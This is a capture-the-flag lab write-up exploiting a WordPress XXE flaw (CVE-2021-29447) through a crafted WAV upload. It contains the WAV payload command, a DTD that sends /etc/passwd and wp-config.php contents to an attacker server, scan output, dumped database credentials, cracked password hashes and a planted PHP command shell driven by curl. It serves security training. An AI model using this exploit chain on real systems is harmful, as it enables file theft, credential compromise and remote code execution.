## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
# Wordpress: CVE-2021-29447

Vulnerability allow a authenticated user whith low privilages upload a malicious WAV file that could lead to remote arbitrary file disclosure and server-side request forgery (SSRF).

An XXE vulnerability consists of an injection that takes advantage of the poor configuration of the XML interpreter. This allows us to include external entities, enabling us attack to applications that interpret XML language in their parameters. We'll explore a recent XXE vulnerability, albeit one that comes with some situational caveats.

Researchers at security firm SonarSource discovered an XML external entity injection (XXE) security flaw in the WordPress Media Library. The vulnerability can be exploited only when this CMS runs in PHP 8 _and_ the attacking user has permissions to upload media files. Take note of the latter condition as we walk through an example of exploiting this vulnerability below.

## Impact

- **Arbitrary File Disclosure**: The contents of any file on the host’s file system could be retrieved, e.g. _wp-config.php_ which contains sensitive data such as database credentials.
- **Server-Side Request Forgery (SSRF)**: HTTP requests could be made on behalf of the WordPress installation. Depending on the environment, this can have a serious impact.
  
user: test-corp  
password: [password omitted]
**Creating a malicious WAV file.**

It's very easy, in your bash console enter the following command:

`nano poc.wav   echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav   `

On your attack machine (likely Kali or the TryHackMe AttackBox) create a dtd file with the following code. This will allow us to execute code following the webserver fetching the dtd file. Be sure the name of this file matches what you put entered in the .wav file for NAMEEVIL.dtd (see the previous code blurb).

`<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">   <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >`

Now launch an http server in the same directory as the dtd file.

`php -S 0.0.0.0:PORT`  

Now upload the malicious .wav to the WordPress application!
```
#CVE-2021-29447 
## IP-Address
```IP
10.49.159.233
```
## Enumeration
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f0:65:b8:42:b7:c3:ba:8e:fe:e4:3c:cd:57:f1:29:2e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcR2YGlO+RE25XRqWOY3iSi0YN74QA7E8aywAFyZ/wr3/YQ0jEDjuubawCZ9LtNF0midFnnvvwrkNkgB1BpIm+5aPDDFvSYD27N8N2ttRtlqpNn9f/19sy8tg+wqgMER+peUep4MwbyQlqXF47qLLAX8nHakWw9x2+jQfdFzzjT2zPdTSCQj2NJpvKdDydQ2tgyuLLs5G34tRMLY50fhuSGT2UQy5UIExU93QBc1tJF1SG+6dJDFH1sF+H2W46ia6+F+ahBRJW3U4KFrVKdiPJY9WRwplgxWSXUUAC8MZCc2cu5SRw/RIyhOo8UrXvTdK3FW8daHwP4jJmG7SttTBl
|   256 42:1e:1b:8f:19:38:99:2e:36:70:cf:0e:b6:31:92:14 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF38YSGKHd8ih4VMad2mCdquKkSrnV9HcQInJk5Fjid6dfvdZ9KfhhltpAc7JfUdLCxeQJgAJjw85FyVbW4/Yyw=
|   256 8e:89:43:de:5d:9b:99:66:c4:2a:93:17:f3:0e:e1:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOctHMK4vQg3/HTOb2aPZuDEfPfw1CZa7KEB2FgIrvcj
80/tcp   open  http    syn-ack ttl 62 Apache httpd 2.4.18
|_http-title: Tryhackme &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: WordPress 5.6.2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   syn-ack ttl 62 MySQL 5.7.33-0ubuntu0.16.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.33_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-26T21:23:31
| Not valid after:  2031-05-24T21:23:31
| MD5:     11ba f643 0f68 ea0d 7b7f c7d5 7822 edbf
| SHA-1:   d85c 8df5 d53c ea63 666b 25d5 66d0 3c14 07be 3feb
| SHA-256: 0452 69f2 8606 b8b4 9119 9018 bc7e 5b6c d879 40ff 5415 c143 4708 2958 5b88 f0d0
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjMzX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIxMDUyNjIxMjMzMVoXDTMxMDUyNDIxMjMzMVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy4zM19BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7g4pUauY914tl4RkcpQec
| GKvuJKIlaCZhxV5OaKQ0iflswSNIR2k2e9eN2zo06wgCfaRqQqD/wpaz2/me622h
| hO+fdFeL9CBycNAuUJC/I9YzKSH2kv4/DVo5Ej/nb9poNDgeHf4+VvGiDNuVU6HD
| +5cZEHw/47NP+51+03rK6sEG3Wc+sKkTnMaNr+hiiL75YyJmDY83z/gErufDWWkd
| 47RJ3N2Km4CvnT3FwyVCE4Bc9ixA1fcZVkK4UFqn4a+B59k3rU6gorUxzZVnh5Iq
| 2JiyULtU7TxcfZ03ONx16E1mrw7D/Py+JgBF3hVa0nlo9Y9kRCiwoF1AkWmMS5Z7
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBANMjsaix
| wkIH3E5m27aYby+4HItU5I0qTDALbQktZcWZOG+HGhdLOtCnPiGwuEPQ7or4HMi3
| I9/Y4E5Cwqeb0CgWh/Nt+6N/VDqNSaGfH1G8oX3oXhUBJ+G8CIyDGvNVme2o5IwY
| FFjRn0UbhHfQl5U76xOAeXdRgT6u2xQw5gvm6oVYZERSpOLGPvfCwRLyRcGaBjs/
| ATGgR39CcZmOV0TPmxWmvpca5TaL5m3kaCSlpwxyqZxYxjGQiWhU4geAQ8STImQQ
| dZimtduyhdZ600BremRZIzWNdfSNPnTbIiJyhQt/AziBgARrCtn67gTmv6IwY4w4
| IDu2bCdtm64gNoU=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.16.04.1
|   Thread ID: 8
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, InteractiveClient, DontAllowDatabaseTableColumn, LongPassword, SupportsTransactions, ConnectWithDatabase, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, Support41Auth, SupportsCompression, ODBCClient, FoundRows, IgnoreSigpipes, LongColumnFlag, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: *O;\x13%oK\x7FK\x10P2\x02\x1C\x01\x1AG[6\x0D
|_  Auth Plugin Name: mysql_native_password
```
- Discover Hidden Directory
```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
wp-content           (Status: 301) [Size: 319] [--> http://10.49.159.233/wp-content/]
wp-includes          (Status: 301) [Size: 320] [--> http://10.49.159.233/wp-includes/]
wp-admin             (Status: 301) [Size: 317] [--> http://10.49.159.233/wp-admin/]
```
- Web Content 
```bash
- http://10.49.159.233/wp-admin/
  Login Page 
  - User - test-corp
  - Pass - [password omitted]
```
- Word-Press Scan
```bash
$ wpscan --url http://10.49.159.233
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | ''_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.

[+] URL: http://10.49.159.233/ [10.49.159.233]
[+] Started: Wed May  6 09:19:29 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://10.49.159.233/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.49.159.233/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.49.159.233/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.49.159.233/index.php/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>
 |  - http://10.49.159.233/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6.2</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://10.49.159.233/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://10.49.159.233/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://10.49.159.233/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.49.159.233/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wp-security-hardening
 | Location: http://10.49.159.233/wp-content/plugins/wp-security-hardening/
 | Last Updated: 2024-09-13T10:33:00.000Z
 | [!] The version is out of date, the latest version is 1.2.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.49.159.233/wp-content/plugins/wp-security-hardening/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.49.159.233/wp-content/plugins/wp-security-hardening/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed May  6 09:19:33 2026
[+] Requests Done: 171
[+] Cached Requests: 6
[+] Data Sent: 43.049 KB
[+] Data Received: 234.76 KB
[+] Memory used: 269.996 MB
[+] Elapsed time: 00:00:04
```
- After Login the Account Upload an `.wav` payload over the server and Host an `php` server on Attacker Machine
- create `*.dtd` file in order to gave base64 data response on the `php` server
```bash
php -S 0.0.0.0:4444

[Wed May  6 09:38:32 2026] 10.49.159.233:40120 [404]: GET /?p=nVZtT+NGEP5cJP7DcK2UKyVxOaSq4lqVQFKCLkdonAjdp2hjr+0Vzu7evoSLTvffO7N2HIdDreA4CWPPPPP+zPzxly704UF0fHx4AMcwKzgsmeWQKJmJ3BvmhJKQKQP3yqR3hltLgo3wo+5Woj3EgcTwSsEmRmgH3nILrhAWMlFySL0RMscXPOgLaR0ry6DRg0/KQ6pkx0HB1hycIm2ShUe+BCscP4ENyiRMBu1E6U0LG+Xf7DnzBphM6VuJhgLOmpWe217L/60yajmG7gSxTJWleiRH95JgzxvFY/i4if8Zg+XOoZytX8Yc43fwwDfbNwPmWEgn/kIz2vBMfKm/9S/ju/5s1IBelEI+QOGctudR9IjZ1pTtnjJ5ZL3WyriIGSeSkkc8FWS42wTcxYCjHZRmyQPL+X7N8DsWOoLjp+5DNyQfEws5+h9yKmSmIDNqRTk3oQSFso6Uoyj0Syi/ZCsOKgt5S7fB7nVLsJti3JK/hc7gcnHb/zjsnECniTBdvuvAz++Dd41vDRg2gQlWnuLM4+GUcNB0ysyDYzLn0v0HkmbWktHvkO76cXw/mQ4Izc71mYnPqJCnZ8/4RUl41p3RJJ4RQKkSVpJUW7fpg6uCGUs5rrobG7MaGWy2dK9XbO87C1ej/jQeBiPeZb+38akUOxuKZgpxNpr3YBBGKikoPXVpM7KbKr90zxiZjMf9WShQy8CPF7+Exup7zLbEHqymfC7FZ8/hAzZ8GLaYla41X1dbo9yG+UxFlnGD+uArRV0YdNgeBeldC0pugv9Bz9uaMuDr/oQwLXpPpiTMXxfnLzrtnUYWvYl2jUgisBPBR7MWCf+2Zzxpu8wcRrUBrQS6TBwiViEOIZFJREo+In0B/yKsq+hCPQiqXCCWR2IeHIWkkqI+tqS9ZbdS5QTKciSeXc4uMFzUeNf7rfdrPbRNefrz2WjxYfgJi7P919HeVRO6l1IoMM9V/RrteHg1nw4XbZAXaI8n19fDweLmdufAC7RvJ7dXw33XX6AdXI7749mrtNtx1yCvirtx4MVx77n+/9r1xHVrwq43845Qm0GftZbKroO2rRz6bOVLJ3TJ93YtsTso2WJspARarblAFc6SIgCxxsPKAkxkuQHpV0vs5BMocXuEB5p8L1N8ThQ6CGgOMY/q7v0p0NmiwoA/kfe1M5tF5307uL9xY6R8zUulEea8FWzKlz7PabpWKuXPcIsIQ+WMD0PFZchJWEfC6pJtaDtJhZSFntX3R21phUwUAOEGx9uCdUbJHEM0PFEr/JryFJGQBXTpcxpVSX9zJIGdr4HG7+8Wg+Hl/Lq+akhImLYZ9GstEJ2eWwRJYdOiNauKT+k/6ho6PLBcKFvZp3IuwypMw3JtknISYNYCr6MqZpV4slGdVK86LRrsrpDdRjR6ykXbkLGvM1ZiDradi+THXMcS551gSpWG+lg5ghHTeLJpvyyFLfDN3vYhxNEknAYBsDVH9Cm+mQ3n03H7a7X6+kurSu9ovbsitELB2/0jsJpOmU1lDBv9LRxBBZwSt1RXGE4e/nw9PPhhxzr1lxNYLAY308UCetCJqhH9trUec6yR1y2Da1zwoVOQx0tPLUQXZr3ODf/s0aGFIo6vDRAs3nHbY4xOVxqOfwE= - No such file or directory
[Wed May  6 09:38:32 2026] 10.49.159.233:40120 Closing
```
- First Response of /etc/passwd - `Base64`
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
stux:x:1000:1000:CVE-2021-29447,,,:/home/stux:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
```
- Second Response of the Request `/var/www/html/wp-config.php`
```
[Wed May  6 09:38:32 2026] 10.49.159.233:40122 Accepted
[Wed May  6 09:38:32 2026] 10.49.159.233:40122 [200]: GET /NAMEEVIL.dtd
[Wed May  6 09:38:32 2026] 10.49.159.233:40122 Closing
[Wed May  6 09:38:33 2026] 10.49.159.233:40124 Accepted
[Wed May  6 09:38:33 2026] 10.49.159.233:40124 [404]: GET /?p=nVZtT+NGEP5cJP7DcK2UKyVxOaSq4lqVQFKCLkdonAjdp2hjr+0Vzu7evoSLTvffO7N2HIdDreA4CWPPPPP+zPzxly704UF0fHx4AMcwKzgsmeWQKJmJ3BvmhJKQKQP3yqR3hltLgo3wo+5Woj3EgcTwSsEmRmgH3nILrhAWMlFySL0RMscXPOgLaR0ry6DRg0/KQ6pkx0HB1hycIm2ShUe+BCscP4ENyiRMBu1E6U0LG+Xf7DnzBphM6VuJhgLOmpWe217L/60yajmG7gSxTJWleiRH95JgzxvFY/i4if8Zg+XOoZytX8Yc43fwwDfbNwPmWEgn/kIz2vBMfKm/9S/ju/5s1IBelEI+QOGctudR9IjZ1pTtnjJ5ZL3WyriIGSeSkkc8FWS42wTcxYCjHZRmyQPL+X7N8DsWOoLjp+5DNyQfEws5+h9yKmSmIDNqRTk3oQSFso6Uoyj0Syi/ZCsOKgt5S7fB7nVLsJti3JK/hc7gcnHb/zjsnECniTBdvuvAz++Dd41vDRg2gQlWnuLM4+GUcNB0ysyDYzLn0v0HkmbWktHvkO76cXw/mQ4Izc71mYnPqJCnZ8/4RUl41p3RJJ4RQKkSVpJUW7fpg6uCGUs5rrobG7MaGWy2dK9XbO87C1ej/jQeBiPeZb+38akUOxuKZgpxNpr3YBBGKikoPXVpM7KbKr90zxiZjMf9WShQy8CPF7+Exup7zLbEHqymfC7FZ8/hAzZ8GLaYla41X1dbo9yG+UxFlnGD+uArRV0YdNgeBeldC0pugv9Bz9uaMuDr/oQwLXpPpiTMXxfnLzrtnUYWvYl2jUgisBPBR7MWCf+2Zzxpu8wcRrUBrQS6TBwiViEOIZFJREo+In0B/yKsq+hCPQiqXCCWR2IeHIWkkqI+tqS9ZbdS5QTKciSeXc4uMFzUeNf7rfdrPbRNefrz2WjxYfgJi7P919HeVRO6l1IoMM9V/RrteHg1nw4XbZAXaI8n19fDweLmdufAC7RvJ7dXw33XX6AdXI7749mrtNtx1yCvirtx4MVx77n+/9r1xHVrwq43845Qm0GftZbKroO2rRz6bOVLJ3TJ93YtsTso2WJspARarblAFc6SIgCxxsPKAkxkuQHpV0vs5BMocXuEB5p8L1N8ThQ6CGgOMY/q7v0p0NmiwoA/kfe1M5tF5307uL9xY6R8zUulEea8FWzKlz7PabpWKuXPcIsIQ+WMD0PFZchJWEfC6pJtaDtJhZSFntX3R21phUwUAOEGx9uCdUbJHEM0PFEr/JryFJGQBXTpcxpVSX9zJIGdr4HG7+8Wg+Hl/Lq+akhImLYZ9GstEJ2eWwRJYdOiNauKT+k/6ho6PLBcKFvZp3IuwypMw3JtknISYNYCr6MqZpV4slGdVK86LRrsrpDdRjR6ykXbkLGvM1ZiDradi+THXMcS551gSpWG+lg5ghHTeLJpvyyFLfDN3vYhxNEknAYBsDVH9Cm+mQ3n03H7a7X6+kurSu9ovbsitELB2/0jsJpOmU1lDBv9LRxBBZwSt1RXGE4e/nw9PPhhxzr1lxNYLAY308UCetCJqhH9trUec6yR1y2Da1zwoVOQx0tPLUQXZr3ODf/s0aGFIo6vDRAs3nHbY4xOVxqOfwE= - No such file or directory
[Wed May  6 09:38:33 2026] 10.49.159.233:40124 Closing
```
- `Base64` Decryption
```
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpressdb2' );

/** MySQL database username */
define( 'DB_USER', 'thedarktangent' );

/** MySQL database password */
define( 'DB_PASSWORD', 'sUp3rS3cret132' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wptry_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */
define('WP_HOME', false);
define('WP_SITEURL', false);

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```
- Credentials
```Creds
DBname = wordpressdb2
DBUser = thedarktangent
DBPass = sUp3rS3cret132
DBHost = localhost
```
- `MYSQL`-Login
```bash
$ mysql --ssl-verify-server-cert=OFF -h 10.49.159.233 -u thedarktangent -psUp3rS3cret132
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 122
Server version: 5.7.33-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>	SHOW tables;
ERROR 1046 (3D000): No database selected
MySQL [(none)]>	show DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpressdb2       |
+--------------------+
5 rows in set (0.040 sec)

MySQL [(none)]>	USE wordpressdb2
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpressdb2]> SHOW Tables;
+--------------------------+
| Tables_in_wordpressdb2   |
+--------------------------+
| wptry_commentmeta        |
| wptry_comments           |
| wptry_links              |
| wptry_options            |
| wptry_postmeta           |
| wptry_posts              |
| wptry_term_relationships |
| wptry_term_taxonomy      |
| wptry_termmeta           |
| wptry_terms              |
| wptry_usermeta           |
| wptry_users              |
+--------------------------+
12 rows in set (0.037 sec)

MySQL [wordpressdb2]> SELECT ID,user_login,user_email,user_pass FROM wptry_users;
+----+------------+------------------------------+------------------------------------+
| ID | user_login | user_email                   | user_pass                          |
+----+------------+------------------------------+------------------------------------+
|  1 | corp-001   | corp-001@fakemail.com        | $P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1 |
|  2 | test-corp  | test-corp@tryhackme.fakemail | $P$Bk3Zzr8rb.5dimh99TRE1krX8X85eR0 |
+----+------------+------------------------------+------------------------------------+
2 rows in set (0.039 sec)
```
- Password Decryption
```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 512/512 AVX512BW 16x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
"teddybear"        (?)
"test"             (?)
2g 0:00:00:01 DONE (2026-05-06 09:50) 1.980g/s 165005p/s 165766c/s 165766C/s tysonr..sombra1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
- Got the Creds
- Now need to Compromise the System and Locate the flag
- Login on the Wordpress using `Corp-001` as Adminstrator
```bash
Edit Plugin and Create an PhP cmd Commands line
```
- Got the Access
```bash
$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>                                                                                                         
$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=ls -la"
curl: (3) URL rejected: Malformed input to a URL function

$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=ls"
<pre>LICENSE.txt
_inc
akismet.php
changelog.txt
class.akismet-admin.php
class.akismet-cli.php
class.akismet-rest-api.php
class.akismet-widget.php
class.akismet.php
index.php
readme.txt
views
wrapper.php
</pre>                                                                                                         
$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=ls%20-la%20/home"
<pre>total 12
drwxr-xr-x  3 root root 4096 May 26  2021 .
drwxr-xr-x 22 root root 4096 May 26  2021 ..
drwxr-xr-x  5 stux stux 4096 May 26  2021 stux
</pre>                                                                                                         
$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=ls%20-la%20/home/stux"
<pre>total 44
drwxr-xr-x 5 stux stux 4096 May 26  2021 .
drwxr-xr-x 3 root root 4096 May 26  2021 ..
-rw------- 1 root root 3359 May 26  2021 .bash_history
-rw-r--r-- 1 stux stux  220 May 26  2021 .bash_logout
-rw-r--r-- 1 stux stux 3771 May 26  2021 .bashrc
drwx------ 2 stux stux 4096 May 26  2021 .cache
-rw------- 1 stux stux  131 May 26  2021 .mysql_history
drwxrwxr-x 2 stux stux 4096 May 26  2021 .nano
-rw-r--r-- 1 stux stux  655 May 26  2021 .profile
-rw-r--r-- 1 stux stux    0 May 26  2021 .sudo_as_admin_successful
-rw-r--r-- 1 root root  183 May 26  2021 .wget-hsts
drwxrwxr-x 2 stux stux 4096 May 26  2021 flag
</pre>                                                                                                         
$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=cat%20/home/stux/flag"
<pre></pre>                                                            

$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=ls%20/home/stux/flag"
<pre>flag.txt
</pre>                                                                                                         
$ curl "http://10.49.159.233/wp-content/plugins/akismet/akismet.php?cmd=cat%20/home/stux/flag/flag.txt"
<pre>[flag omitted]
</pre> 
```
#### Flag
```Flag
[flag omitted]
```
# END